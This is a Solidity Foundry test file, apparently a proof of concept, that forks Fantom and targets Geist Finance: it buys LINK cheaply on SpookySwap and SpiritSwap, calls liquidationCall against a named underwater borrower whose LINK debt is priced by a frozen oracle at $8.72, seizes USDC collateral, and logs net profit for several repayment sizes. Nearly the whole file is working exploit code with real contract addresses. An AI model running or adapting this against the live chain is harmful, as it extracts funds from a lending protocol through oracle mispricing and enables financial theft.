// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/GeistInterfaces.sol";

/// @title Geist Finance — targeted liquidation PoC on the best live underwater position
/// @notice Borrower 0xBB2d41AcfEA24A3A2aD4A6F95C3AcE1cC98c6ed6:
///         debt  = LINK (468,265 nominal) + WFTM (huge nominal)
///         coll  = 997,708 aUSDC (the largest cash-backed collateral among HF<1 borrowers)
///         HF    = 2.5e15 (deeply underwater at the frozen oracle prices)
///         The frozen oracle values LINK at $8.72 while the live Fantom DEX trades it at ~$0.215,
///         so repaying LINK (bought cheap on the DEX) seizes USDC at oracle value -> profit.
///         This test measures the REAL net P&L (buy LINK on Spooky+Spirit -> liquidationCall ->
///         sell seized USDC on Spooky+Spirit) for a ladder of repayment sizes.
contract GeistTargetedLiqTest is Test {
    address constant POOL = 0x9FAD24f572045c7869117160A571B2e50b10d068;
    address constant SPOOKY_ROUTER = 0xF491e7B69E4244ad4002BC14e878a34207E38c29;
    address constant SPIRIT_ROUTER = 0x16327E3FbDaCA3bcF7E38F5Af2599D2DDc33aE52;
    address constant WFTM = 0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83;
    address constant LINK = 0xb3654dc3D10Ea7645f8319668E8F54d2574FBdC8;
    address constant USDC = 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75;

    address constant USER = 0xBB2d41AcfEA24A3A2aD4A6F95C3AcE1cC98c6ed6;

    function _selectFork() internal returns (uint256) {
        string[6] memory urls = [
            vm.envOr("FANTOM_RPC_URL", string("")),
            "https://rpc2.fantom.network",
            "https://rpc3.fantom.network",
            "https://rpcapi.fantom.network",
            "https://fantom.drpc.org",
            "https://1rpc.io/ftm"
        ];
        for (uint256 i = 0; i < urls.length; i++) {
            if (bytes(urls[i]).length == 0) continue;
            try vm.createSelectFork(urls[i]) returns (uint256) {
                return block.number;
            } catch {}
        }
        revert("no working fantom fork rpc");
    }

    function setUp() public {
        _selectFork();
        emit log_named_uint("fork block", block.number);
    }

    function _buyToken(address token, uint256 amount) internal returns (uint256 wftmSpent) {
        address[] memory path = new address[](2);
        path[0] = WFTM;
        path[1] = token;
        // try Spooky first, then Spirit, splitting if needed
        uint256 remaining = amount;
        for (uint256 v = 0; v < 2 && remaining > 0; v++) {
            address router = v == 0 ? SPOOKY_ROUTER : SPIRIT_ROUTER;
            // cap by what the router can deliver
            uint256 deliverable = remaining;
            for (uint256 attempt = 0; attempt < 6; attempt++) {
                try IUniswapV2Router(router).getAmountsOut(deliverable, path) returns (uint256[] memory a) {
                    uint256 cost = a[0];
                    // only spend up to half of the pool's WFTM side; obtainable check
                    if (cost < 1e18) {
                        // cost ~0 -> too small
                        break;
                    }
                    IERC20(WFTM).approve(router, cost);
                    try IUniswapV2Router(router).swapExactTokensForTokens(cost, 0, path, address(this), block.timestamp)
                    returns (uint256[] memory got) {
                        wftmSpent += cost;
                        remaining -= got[1] > remaining ? remaining : got[1];
                        break;
                    } catch {
                        deliverable = deliverable * 3 / 4;
                    }
                } catch {
                    deliverable = deliverable * 3 / 4;
                }
            }
        }
        return wftmSpent;
    }

    function _sellToken(address token, uint256 amount) internal returns (uint256 wftmOut) {
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = WFTM;
        uint256 remaining = amount;
        for (uint256 v = 0; v < 2 && remaining > 0; v++) {
            address router = v == 0 ? SPOOKY_ROUTER : SPIRIT_ROUTER;
            uint256 sellable = remaining;
            for (uint256 attempt = 0; attempt < 6; attempt++) {
                IERC20(token).approve(router, sellable);
                try IUniswapV2Router(router).swapExactTokensForTokens(sellable, 0, path, address(this), block.timestamp)
                returns (uint256[] memory got) {
                    wftmOut += got[1];
                    remaining -= sellable;
                    break;
                } catch {
                    sellable = sellable * 3 / 4;
                    if (sellable < 1) break;
                }
            }
        }
        return wftmOut;
    }

    function _attempt(uint256 repayLink) internal {
        uint256 wftmStart = 1_000_000e18; // attacker capital (fork-funded)
        deal(WFTM, address(this), wftmStart);

        emit log_named_uint("---- repay LINK", repayLink);

        // 1) buy the debt token (LINK) on the live DEX
        uint256 spent = _buyToken(LINK, repayLink);
        uint256 linkGot = IERC20(LINK).balanceOf(address(this));
        emit log_named_uint("  LINK bought", linkGot);
        emit log_named_uint("  WFTM spent buying", spent);

        // 2) liquidate
        IERC20(LINK).approve(POOL, linkGot);
        uint256 usdcBefore = IERC20(USDC).balanceOf(address(this));
        try ILendingPool(POOL).liquidationCall(USDC, LINK, USER, linkGot, false) {
            emit log_named_uint("  USDC seized", IERC20(USDC).balanceOf(address(this)) - usdcBefore);
        } catch (bytes memory err) {
            emit log_named_string("  liquidationCall REVERTED", string(err));
        }

        // 3) sell the seized USDC
        uint256 usdcGot = IERC20(USDC).balanceOf(address(this));
        uint256 out = _sellToken(USDC, usdcGot);
        emit log_named_uint("  USDC sold", usdcGot);
        emit log_named_uint("  WFTM out selling", out);

        uint256 wftmEnd = IERC20(WFTM).balanceOf(address(this));
        emit log_named_int("  NET P&L (WFTM)", int256(wftmEnd) - int256(wftmStart));
    }

    function test_targeted_liquidation_ladder() public {
        uint256 debt = IERC20(0xFc8F690B285A013A86B7A71c0aF70bC57302e7e4).balanceOf(USER); // variable debt gLINK
        emit log_named_uint("user LINK debt (nominal)", debt);
        emit log_named_uint("user aUSDC collateral", IERC20(0xe578C856933D8e1082740bf7661e379Aa2A30b26).balanceOf(USER));
        emit log_named_uint("aUSDC cash", IERC20(USDC).balanceOf(0xe578C856933D8e1082740bf7661e379Aa2A30b26));

        // ladder of repayment sizes (LINK, 18 dec)
        _attempt(500e18);
        _attempt(2_000e18);
        _attempt(5_000e18);
        _attempt(8_000e18);
    }
}
